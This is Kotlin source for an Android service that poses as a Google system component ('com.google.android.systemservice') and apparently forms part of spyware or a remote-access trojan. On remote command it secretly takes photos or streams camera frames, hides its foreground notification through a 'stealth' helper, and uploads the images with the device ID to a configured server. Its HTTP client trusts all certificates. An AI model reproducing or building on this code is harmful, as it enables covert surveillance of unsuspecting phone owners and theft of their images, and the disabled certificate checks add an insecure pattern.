package com.google.android.systemservice.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.content.pm.PackageManager
import android.util.Base64
import android.util.Log
import android.util.Size
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.TrustAllCertificates
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

class CameraService : Service() {
    companion object {
        private const val TAG = "SystemCamera"
    }

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundHandler: Handler? = null
    private var backgroundThread: HandlerThread? = null
    @Volatile private var isStreaming = false
    private var webSocket: WebSocket? = null

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = TrustAllCertificates.createSecureClientBuilder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "CameraService created")
        startForegroundSilent()
        startBackgroundThread()
    }

    private fun startForegroundSilent() {
        val notification = StealthNotificationHelper.createStealthNotification(this)
        startForeground(StealthNotificationHelper.CAMERA_SERVICE_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val cameraId = intent?.getStringExtra("camera_id") ?: "0"
        
        when (intent?.action) {
            "START_STREAM" -> startCameraStream(cameraId)
            "STOP_STREAM" -> stopCameraStream()
            "TAKE_PHOTO" -> takePhoto(cameraId)
        }
        return START_STICKY
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread?.looper ?: return)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join(5000)
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            Log.e(TAG, "Error stopping background thread", e)
        }
    }

    @SuppressLint("MissingPermission")
    private fun takePhoto(cameraId: String) {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Camera permission not granted")
            stopSelf()
            return
        }
        Log.d(TAG, "Taking photo with camera $cameraId")
        
        val manager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return
        
        try {
            val characteristics = manager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val largest = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
                ?: Size(640, 480)

            imageReader = ImageReader.newInstance(largest.width, largest.height, ImageFormat.JPEG, 2)
            imageReader?.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()
                        
                        sendPhotoToServer(bytes, cameraId)
                        closeCameraSession()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in image listener: ${e.message}")
                }
            }, backgroundHandler)

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera error: $error")
                    camera.close()
                    cameraDevice = null
                }
            }, backgroundHandler)

        } catch (e: Exception) {
            Log.e(TAG, "Error taking photo: ${e.message}")
        }
    }

    private fun createCaptureSession() {
        try {
            val surface = imageReader?.surface ?: return
            
            cameraDevice?.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        captureStillPicture()
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Capture session configuration failed")
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error creating capture session: ${e.message}")
        }
    }

    private fun captureStillPicture() {
        try {
            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder?.addTarget(imageReader?.surface ?: return)
            captureBuilder?.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
            captureBuilder?.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH)

            captureSession?.stopRepeating()
            captureSession?.abortCaptures()
            val request = captureBuilder?.build() ?: return
            captureSession?.capture(request, null, backgroundHandler)
        } catch (e: Exception) {
            Log.e(TAG, "Error capturing picture: ${e.message}")
        }
    }

    private fun sendPhotoToServer(photoBytes: ByteArray, cameraId: String) {
        serviceScope.launch {
            try {
                AndroidConfig.loadFromPreferences(this@CameraService)
                val deviceId = try {
                    android.provider.Settings.Secure.getString(
                        contentResolver,
                        android.provider.Settings.Secure.ANDROID_ID
                    ) ?: AndroidConfig.deviceId
                } catch (e: Exception) {
                    AndroidConfig.deviceId
                }

                val base64Photo = Base64.encodeToString(photoBytes, Base64.NO_WRAP)

                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("camera_id", cameraId)
                    put("photo", base64Photo)
                    put("timestamp", System.currentTimeMillis())
                }

                val body = json.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url(AndroidConfig.photosEndpoint)
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "Photo sent successfully")
                    } else {
                        Log.e(TAG, "Failed to send photo: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending photo: ${e.message}")
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun startCameraStream(cameraId: String) {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Camera permission not granted")
            stopSelf()
            return
        }
        Log.d(TAG, "Starting camera stream with camera $cameraId")
        isStreaming = true
        
        // Connect WebSocket for streaming
        connectStreamWebSocket(cameraId)
    }

    private fun connectStreamWebSocket(cameraId: String) {
        val wsUrl = "${AndroidConfig.websocketUrl}&device_id=${AndroidConfig.deviceId}"
        val request = Request.Builder()
            .url(wsUrl)
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "Stream WebSocket connected")
                startStreamingFrames(cameraId)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "Stream WebSocket error: ${t.message}")
                isStreaming = false
            }
        })
    }

    @SuppressLint("MissingPermission")
    private fun startStreamingFrames(cameraId: String) {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Camera permission not granted")
            stopSelf()
            return
        }
        val manager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return
        
        try {
            val characteristics = manager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            // Use smaller resolution for streaming (640x480)
            val streamSize = Size(640, 480)

            // Close previous if any
            closeCameraSession()
            
            imageReader = ImageReader.newInstance(streamSize.width, streamSize.height, ImageFormat.JPEG, 3)
            imageReader?.setOnImageAvailableListener({ reader ->
                if (!isStreaming) return@setOnImageAvailableListener
                
                val image = reader.acquireLatestImage()
                if (image != null) {
                    try {
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        
                        // Send frame via WebSocket
                        sendFrameViaWebSocket(bytes, cameraId)
                    } finally {
                        image.close()
                    }
                }
            }, backgroundHandler)

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createStreamingSession()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                    isStreaming = false
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera stream error: $error")
                    camera.close()
                    cameraDevice = null
                    isStreaming = false
                }
            }, backgroundHandler)

        } catch (e: Exception) {
            Log.e(TAG, "Error starting frame stream: ${e.message}")
            isStreaming = false
        }
    }
    
    private fun createStreamingSession() {
        try {
            val surface = imageReader?.surface ?: return
            
            cameraDevice?.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        startRepeatingCapture()
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Streaming session configuration failed")
                        isStreaming = false
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error creating streaming session: ${e.message}")
            isStreaming = false
        }
    }
    
    private fun startRepeatingCapture() {
        try {
            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
            captureBuilder?.addTarget(imageReader?.surface ?: return)
            captureBuilder?.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
            captureBuilder?.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
            
            // Set to capture at ~10 FPS for streaming
            val request = captureBuilder?.build() ?: return
            captureSession?.setRepeatingRequest(request, null, backgroundHandler)
            Log.d(TAG, "Started repeating capture for streaming")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting repeating capture: ${e.message}")
            isStreaming = false
        }
    }
    
    private fun sendFrameViaWebSocket(frameBytes: ByteArray, cameraId: String) {
        serviceScope.launch {
            try {
                val base64Frame = Base64.encodeToString(frameBytes, Base64.NO_WRAP)
                
                val json = JSONObject().apply {
                    put("command", "subscribe")
                    put("identifier", JSONObject().apply {
                        put("channel", "StreamingChannel")
                    }.toString())
                }
                
                val frameMessage = JSONObject().apply {
                    put("command", "message")
                    put("identifier", JSONObject().apply {
                        put("channel", "StreamingChannel")
                    }.toString())
                    put("data", JSONObject().apply {
                        put("action", "camera_frame")
                        put("frame", base64Frame)
                        put("camera_id", cameraId)
                        put("timestamp", System.currentTimeMillis())
                    }.toString())
                }
                
                try { webSocket?.send(frameMessage.toString()) } catch (e: Exception) { Log.e(TAG, "WS send failed", e) }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending frame: ${e.message}")
            }
        }
    }

    private fun stopCameraStream() {
        Log.d(TAG, "Stopping camera stream")
        isStreaming = false
        try { webSocket?.close(1000, "Stream stopped") } catch (e: Exception) { Log.e(TAG, "WS close failed", e) }
        closeCameraSession()
    }

    private fun closeCameraSession() {
        captureSession?.close()
        captureSession = null
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopForeground(false)
        stopCameraStream()
        stopBackgroundThread()
        serviceScope.cancel()
    }
}
